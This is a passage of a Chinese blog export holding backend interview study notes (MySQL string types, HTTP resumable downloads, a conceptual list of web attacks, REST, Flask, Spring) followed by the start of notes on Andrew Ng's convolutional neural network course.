<li><p>char(n) 固定长度，char(4)不管是存入几个字符，都将占用4个字节，varchar是存入的实际字符数+1个字节（n&lt;&#x3D;255）或2个字节(n&gt;255)，所以varchar(4),存入3个字符将占用4个字节。</p>
</li>
<li><p>char类型的字符串检索速度要比varchar类型的快。</p>
</li>
</ol>
<p>varchar和text：</p>
<ol>
<li><p>varchar可指定n，text不能指定，内部存储varchar是存入的实际字符数+1个字节（n&lt;&#x3D;255）或2个字节(n&gt;255)，text是实际字符数+2个字节。</p>
</li>
<li><p>text类型不能有默认值。</p>
</li>
<li><p>varchar可直接创建索引，text创建索引要指定前多少个字符。varchar查询速度快于text,在都创建索引的情况下，text的索引似乎不起作用。</p>
</li>
</ol>
<h3 id="2-11-redis-与-MySQL-的区别"><a href="#2-11-redis-与-MySQL-的区别" class="headerlink" title="2.11. redis 与 MySQL 的区别"></a>2.11. redis 与 MySQL 的区别</h3><p>redis 本质上是一个Key-Value类型的内存数据库，是非关系型数据，支持字符串 String、字典 Hash、列表 List、集合 Set、有序集合 SortedSet 等多种数据类型。</p>
<h2 id="3-计算机网络"><a href="#3-计算机网络" class="headerlink" title="3. 计算机网络"></a>3. 计算机网络</h2><p>推荐阅读《计算机网络——自顶向下方法》，或查看我的《计算机网络》系列笔记。</p>
<h3 id="3-1-断点续传"><a href="#3-1-断点续传" class="headerlink" title="3.1. 断点续传"></a>3.1. 断点续传</h3><p><a href="https://blog.csdn.net/xifeijian/article/details/8712439">参考博客</a></p>
<p>HTTP1.1协议（RFC2616）中定义了断点续传相关的HTTP头 Range和Content-Range字段，一个最简单的断点续传实现大概如下：</p>
<ol>
<li>客户端下载一个1024K的文件，已经下载了其中512K</li>
<li>网络中断，客户端请求续传，因此需要在HTTP头中申明本次需要续传的片段：<code>Range:bytes=512000-</code>。这个头通知服务端从文件的512K位置开始传输文件。</li>
<li>服务端收到断点续传请求，从文件的512K位置开始传输，并且在HTTP头中增加：<code>Content-Range:bytes 512000-/1024000</code>。并且此时服务端返回的HTTP状态码应该是206，而不是200。</li>
</ol>
<h3 id="3-2-网络攻击"><a href="#3-2-网络攻击" class="headerlink" title="3.2. 网络攻击"></a>3.2. 网络攻击</h3><ul>
<li><p>拒绝服务攻击(Dos)。使得网络、主机不能由合法用户使用。大多数Dos攻击属于以下三种类型之一：弱点攻击、带宽攻击、连接洪泛。</p>
</li>
<li><p>SQL注入。利用<code>#</code>注释和<code>union</code>联合查询之类的SQL语法实现攻击。</p>
</li>
<li><p>跨站请求伪造(Cross-site request forgery, CSRF)。CSRF 利用的是网站对用户网页浏览器的信任。<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">wiki</a></p>
</li>
<li><p>跨站脚本(Cross-site scripting, XSS)。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">wiki</a>。</p>
</li>
</ul>
<p>参考：<a href="http://www.cyc2018.xyz/%E5%85%B6%E5%AE%83/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html">CSNote - 攻击技术</a></p>
<h2 id="4-数据结构与算法"><a href="#4-数据结构与算法" class="headerlink" title="4. 数据结构与算法"></a>4. 数据结构与算法</h2><p>参考我的数据结构与算法笔记：<a href="https://github.com/99MyCql/DataStructures-and-Algorithms">https://github.com/99MyCql/DataStructures-and-Algorithms</a></p>
<h2 id="5-框架"><a href="#5-框架" class="headerlink" title="5. 框架"></a>5. 框架</h2><h3 id="5-1-REST"><a href="#5-1-REST" class="headerlink" title="5.1. REST"></a>5.1. REST</h3><p><a href="http://www.ruanyifeng.com/blog/2011/09/restful.html">参考博客</a></p>
<p>有个叫<code>Roy Fielding</code>的大佬，他将互联网软件的架构原则，定名为<code>REST</code>，即<code>Representational State Transfer</code>的缩写，这个词组的翻译大致是”表现层状态转化”。</p>
<p>如果一个架构符合REST原则，就称它为<code>RESTful</code>架构。</p>
<p>具体表现为：</p>
<ul>
<li>每一个<code>URI</code>代表一种资源：<blockquote>
<p>我们把”资源”具体呈现出来的形式，叫做它的”表现层”。URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。</p>
</blockquote>
</li>
<li>客户端和服务器之间，传递这种资源的某种表现层：<blockquote>
<p>比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。</p>
</blockquote>
</li>
<li>客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”：<blockquote>
<p>GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。**</p>
</blockquote>
</li>
</ul>
<h3 id="5-2-flask"><a href="#5-2-flask" class="headerlink" title="5.2. flask"></a>5.2. flask</h3><p><a href="https://blog.csdn.net/qq_41891803/article/details/81272575">参考博客</a></p>
<h4 id="Flask-WTF是什么，有什么特点"><a href="#Flask-WTF是什么，有什么特点" class="headerlink" title="Flask-WTF是什么，有什么特点"></a>Flask-WTF是什么，有什么特点</h4><p>Flask的简单WTForms集成，包含CSRF、文件上传和Recaptcha集成。</p>
<p>flask-wtf可以保护表单免受跨站请求伪造（CSRF）的攻击，恶意网站将请求发送到被攻击者已登录的其他网站时就会引发CSRF。</p>
<h4 id="什么是wsgi"><a href="#什么是wsgi" class="headerlink" title="什么是wsgi"></a>什么是wsgi</h4><p>WSGI（Web Server Gateway Interface，Web 服务器网关接口）则是Python语言中所定义的Web服务器和Web应用程序之间或框架之间的通用接口标准。</p>
<p>WSGI就是一座桥梁，桥梁的一端称为服务端或网关端，另一端称为应用端或者框架端，WSGI的作用就是在协议之间进行转化。WSGI将Web组件分成了三类：Web 服务器（WSGI Server）、Web中间件（WSGI Middleware）与Web应用程序（WSGI Application）。</p>
<p>Web Server接收HTTP请求，封装一系列环境变量，按照WSGI接口标准调用注册的WSGI Application，最后将响应返回给客户端。</p>
<h4 id="部署flask"><a href="#部署flask" class="headerlink" title="部署flask"></a>部署flask</h4><p>Nginx + uWSGI&#x2F;Gunicorn + flask</p>
<p>不多说，实践出真知。</p>
<h3 id="5-3-spring"><a href="#5-3-spring" class="headerlink" title="5.3. spring"></a>5.3. spring</h3><h4 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h4><p><a href="https://www.zhihu.com/question/23277575/answer/169698662">参考博客</a>讲得是真的好。</p>
<h4 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h4><p><a href="https://juejin.im/post/5b06bf2df265da0de2574ee1">参考博客</a></p>
<p>原理是动态代理（还不太懂</p>
<h2 id="6-语言"><a href="#6-语言" class="headerlink" title="6. 语言"></a>6. 语言</h2><h3 id="6-1-Java"><a href="#6-1-Java" class="headerlink" title="6.1. Java"></a>6.1. Java</h3><h4 id="注解的原理"><a href="#注解的原理" class="headerlink" title="注解的原理"></a>注解的原理</h4><p><a href="https://juejin.im/post/5b45bd715188251b3a1db54f">参考博客</a></p>
<p>注解的本质就是一个继承了 java.lang.annotation.Annotation 接口的接口</p>
<h3 id="6-2-C"><a href="#6-2-C" class="headerlink" title="6.2. C++"></a>6.2. C++</h3><p>参考我的另一篇博客：<a href="https://99mycql.github.io/language/C-C-%E9%87%8D%E9%9A%BE%E7%82%B9.html">C&#x2F;C++重难点</a></p>
<h2 id="7-设计模式"><a href="#7-设计模式" class="headerlink" title="7. 设计模式"></a>7. 设计模式</h2><h2 id="8-其它"><a href="#8-其它" class="headerlink" title="8. 其它"></a>8. 其它</h2><h3 id="微服务-服务发现"><a href="#微服务-服务发现" class="headerlink" title="微服务 - 服务发现"></a>微服务 - 服务发现</h3><ul>
<li><a href="https://segmentfault.com/a/1190000008672912">gRPC服务发现&amp;负载均衡</a></li>
<li><a href="https://learnku.com/articles/34777">gRPC 注册中心,常用的注册中心你懂了?AP 还是 CP (七)
</a></li>
</ul>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>吴恩达深度学习第四课笔记 - 卷积神经网络</title>
    <url>/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>软件杯需要，先略看第四课。</p>
<span id="more"></span>

<h2 id="1-卷积神经网络"><a href="#1-卷积神经网络" class="headerlink" title="1. 卷积神经网络"></a>1. 卷积神经网络</h2><h3 id="1-1-计算机视觉"><a href="#1-1-计算机视觉" class="headerlink" title="1.1.计算机视觉"></a>1.1.计算机视觉</h3><p>计算机视觉中一些待解决的问题：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-1-1.png" alt="1-1-1"></p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-1-2.png" alt="1-1-2"></p>
<h3 id="1-2-边缘检测示例"><a href="#1-2-边缘检测示例" class="headerlink" title="1.2. 边缘检测示例"></a>1.2. 边缘检测示例</h3><p>识别图片中的物体，第一步通常是检测图片中的垂直边缘、水平边缘。（边缘：<code>edge</code>，应该是指在图片中明显的分割线）</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-2-1.png" alt="1-2-1"></p>
<p>用<strong>卷积运算</strong>检测出垂直边缘。<code>filter</code> 被称作：滤波器，或者卷积核：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-2-2.png" alt="1-2-2"></p>
<p>为什么这个卷积运算可以检测出垂直边缘？（数值越大越亮，越小越暗。）</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-2-3.png" alt="1-2-3"></p>
<h3 id="1-3-更多边缘检测的例子"><a href="#1-3-更多边缘检测的例子" class="headerlink" title="1.3. 更多边缘检测的例子"></a>1.3. 更多边缘检测的例子</h3><p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-3-1.png" alt="1-3-1"></p>
<p>不同的滤波器，可以检测不同的边缘。<code>Vertical</code> 滤波器可以检测垂直边缘，<code>Horizontal</code> 滤波器可以检测水平边缘。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-3-2.png" alt="1-3-2"></p>
<p>计算机视觉领域有许多经典滤波器<code>filter</code>，但在CNN中，滤波器的值被当作参数，经过反向传播算法进行学习，最终得到更加有用的滤波器<code>filter</code>。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-3-3.png" alt="1-3-3"></p>
<h3 id="1-4-padding"><a href="#1-4-padding" class="headerlink" title="1.4. padding"></a>1.4. padding</h3><p><code>padding</code>：在图片四周添加填充像素点（填充值一般是0）：</p>
<ul>
<li>防止多次卷积后图像太小</li>
<li>防止边界信息丢失</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-4-1.png" alt="1-4-1"></p>
<ul>
<li><p><code>Valid</code>卷积运算，对原图像不添加<code>padding</code>：$n \times n * f \times f \longrightarrow (n-f+1) \times (n-f+1)$</p>
</li>
<li><p><code>Same</code>卷积运算，对原图像添加<code>padding</code>使得输出图像大小与输入图像大小相等：$(n+2p) \times (n+2p) * f \times f \longrightarrow (n+2p-f+1) \times (n+2p-f+1) &#x3D; n \times n$</p>
</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-4-2.png" alt="1-4-2"></p>
<h3 id="1-5-卷积步长"><a href="#1-5-卷积步长" class="headerlink" title="1.5. 卷积步长"></a>1.5. 卷积步长</h3><p>步长：每次运算后移动的格数。如下图，步长为2，运算完第一次后，向右移动2格。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-5-1.png" alt="1-5-1"></p>
<p>同理，运算完第一行后，向下移动两格。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-5-2.png" alt="1-5-2"></p>
<p>结合<code>padding</code>和步长后，输出图像的大小计算公式（结果向下取整）：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-5-3.png" alt="1-5-3"></p>
<p>在某些数学文献中，卷积运算又被称为互相关（cross-correlation），在运算之前需要对<code>filter</code>进行翻转。但在深度学习领域，一般叫做卷积运算，也不进行<code>filter</code>翻转。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-5-4.png" alt="1-5-4"></p>
<h3 id="1-6-三维卷积"><a href="#1-6-三维卷积" class="headerlink" title="1.6. 三维卷积"></a>1.6. 三维卷积</h3><p>对于一张RGB图像，它的像素值通常是三维立体。例如一张6x6的RGB图像，它实际是6x6x3，第一个6代表高，第二个6代表宽，3代表通道数<code>channel</code>（即R、G、B三值）。</p>
<p>三维卷积运算中，<code>filter</code>滤波器也是三维的，并且<code>filter</code>的通道数必须与图像的通道数相等。值得注意的是，最后输出的图像是二维的。</p>
<p>在下图的例子中，输入图像的第一个3x3x3立方体与<code>filter</code>进行运算：配对位置相乘，最后将27个相乘结果相加，填入4x4输出图像的第一个位置中。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-6-1.png" alt="1-6-1"></p>
<p>多个<code>filter</code>滤波器：不同滤波器检测不同的图像特征，最后输出图像是三维的，它的通道数等于滤波器的个数。</p>
<p>下图的例子中，使用了两个<code>filter</code>滤波器，一个检测垂直边缘，一个检测水平边缘，最后得到2个4x4图像，即结合成4x4x2的图像。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-6-2.png" alt="1-6-2"></p>
<h3 id="1-7-单层卷积网络"><a href="#1-7-单层卷积网络" class="headerlink" title="1.7. 单层卷积网络"></a>1.7. 单层卷积网络</h3><p>在下图的单层卷积网络示例中，6x6x3 输入图像作为输入 $a^{[0]}$，多个滤波器<code>filter</code>作为权重 $w^{[1]}$，不同<code>filter</code>的卷积运算结果加上对应差值 $b_i$，再通过激活函数，最终得到输出 $a^{[1]}$（4x4x2 输出图像）。</p>
<p>$$<br>a^{[1]} &#x3D; g(w^{[1]} a^{[0]} + b^{[1]})<br>$$</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-7-1.png" alt="1-7-1"></p>
<p>计算单层卷积网络的参数：假如一层有10个 3x3x3 的<code>filter</code>，那一个<code>filter</code>将有27个参数，外加一个差值<code>b</code>参数，总共28个参数，10个<code>filter</code>即有280个参数。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-7-2.png" alt="1-7-2"></p>
<p>一些符号的约定：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-7-3.png" alt="1-7-3"></p>
<h3 id="1-8-简单卷积网络示例"><a href="#1-8-简单卷积网络示例" class="headerlink" title="1.8. 简单卷积网络示例"></a>1.8. 简单卷积网络示例</h3><p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-8-1.png" alt="1-8-1"></p>
<p>卷积网络中不同类型的层：</p>
<ul>
<li>卷积层（Convolution，CONV）</li>
<li>池化层（Pooling，POOL）</li>
<li>全连接层（Fully connected，FC）</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-8-2.png" alt="1-8-2"></p>
<h3 id="1-9-池化层"><a href="#1-9-池化层" class="headerlink" title="1.9. 池化层"></a>1.9. 池化层</h3><p>池化：对一个 nxn 区域提取特征值。</p>
<p>池化的作用：我认为是提取主要特征、信息过滤，是向计算性能妥协的过程。</p>
<p>如下图，使用了<strong>最大池化</strong>的方法，对于输入的 4x4 图像，提取每个不重合 2x2 区域的最大值放入输出图像中。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-9-1.png" alt="1-9-1"></p>
<p>在池化计算中，<strong>输出图像信道数一定与输入图像信道数相同</strong>。</p>
<p>池化也可以设置<code>filter</code>大小和步长参数，如下图 $f&#x3D;3$、$s&#x3D;1$（应用较多的是 $f&#x3D;2$、$s&#x3D;2$）。值得注意的是，这些参数没有学习的必要，它们是静态参数。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-9-2.png" alt="1-9-2"></p>
<p><strong>平均池化</strong>：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-9-3.png" alt="1-9-3"></p>
<h3 id="1-10-卷积神经网络示例"><a href="#1-10-卷积神经网络示例" class="headerlink" title="1.10. 卷积神经网络示例"></a>1.10. 卷积神经网络示例</h3><ul>
<li><p>输入一张 32x32x3 的图像。</p>
</li>
<li><p>第一层卷积层：经过一次卷积（6个<code>filter</code>）、一次最大池化，得到 14x14x6 的图像（此处将一次卷积和一次池化看成一层卷积层，也有把它们分开看作两层的）。</p>
</li>
<li><p>第二层卷积层：经过卷积（16个<code>filter</code>）、池化，得到 5x5x16 的图像。</p>
</li>
<li><p>将 5x5x16 的图像转换成一维向量，有400个值，将其作为第三层全连接层的输入。</p>
</li>
<li><p>第三层全连接层：有120个神经元。</p>
</li>
<li><p>第四层全连接层：有84个神经元。</p>
</li>
<li><p>输出层：10个神经元。</p>
</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-10-1.png" alt="1-10-1"></p>
<p>如下参数数量计算可能存在错误。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-10-2.png" alt="1-10-2"></p>
<h3 id="1-11-为什么使用卷积"><a href="#1-11-为什么使用卷积" class="headerlink" title="1.11. 为什么使用卷积"></a>1.11. 为什么使用卷积</h3><p>卷积网络参数数量远小于全连接网络：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-11-1.png" alt="1-11-1"></p>
<p>卷积网络参数少、效率高的原因：</p>
<ul>
<li><strong>权值共享（参数共享）</strong>：滤波器<code>filter</code>中的一个参数（权值）被输入图像中的多个像素点共享。</li>
<li><strong>稀疏连接</strong>：输出图像中的一个像素点仅与输入图像中部分像素点关联。</li>
</ul>
<p><a href="https://zhuanlan.zhihu.com/p/36005930">参考博客</a></p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-11-2.png" alt="1-11-2"></p>
<p>一个猫检测器示例：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C1-11-3.png" alt="1-11-3"></p>
<h2 id="2-深度卷积网络：实例探究"><a href="#2-深度卷积网络：实例探究" class="headerlink" title="2. 深度卷积网络：实例探究"></a>2. 深度卷积网络：实例探究</h2><h3 id="2-1-为什么要进行实例探究"><a href="#2-1-为什么要进行实例探究" class="headerlink" title="2.1. 为什么要进行实例探究"></a>2.1. 为什么要进行实例探究</h3><p>第二周大纲：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C2-1-1.png" alt="2-1-1"></p>
<h3 id="2-2-经典网络"><a href="#2-2-经典网络" class="headerlink" title="2.2. 经典网络"></a>2.2. 经典网络</h3><ul>
<li><code>LeNet - 5</code>：对手写数字的灰度图（32x32x1）进行分类，基本结构是：<code>conv - pool - conv - pool - fc - fc - output</code>，激活函数是 <code>sigmoid</code> 和 <code>tanh</code>（论文信息见左下角）。</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C2-2-1.png" alt="2-2-1"></p>
<ul>
<li><p><code>AlexNet</code>：对 227x227x3 的图像进行 1000 种分类，大致的网络结构如下图。它优于<code>LeNet</code>的地方在于：</p>
<ul>
<li><p>网络更大，参数更多。</p>
</li>
<li><p>使用 <code>ReLu</code> 激活函数。</p>
</li>
<li><p>使用 <code>Maxpooling</code>，而不是平均 <code>pooling</code>。</p>
</li>
<li><p>使用 <code>Dropout</code> 防止过拟合，原理很简单：根据设定的概率，选择性地丢弃当前神经元的输出，如下图：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C2-2-5.png" alt="2-2-5"></p>
</li>
<li><p>多个GPU并行计算（过时）。</p>
</li>
<li><p>使用局部响应归一层 LRN （没啥用？已过时）。</p>
</li>
</ul>
</li>
</ul>
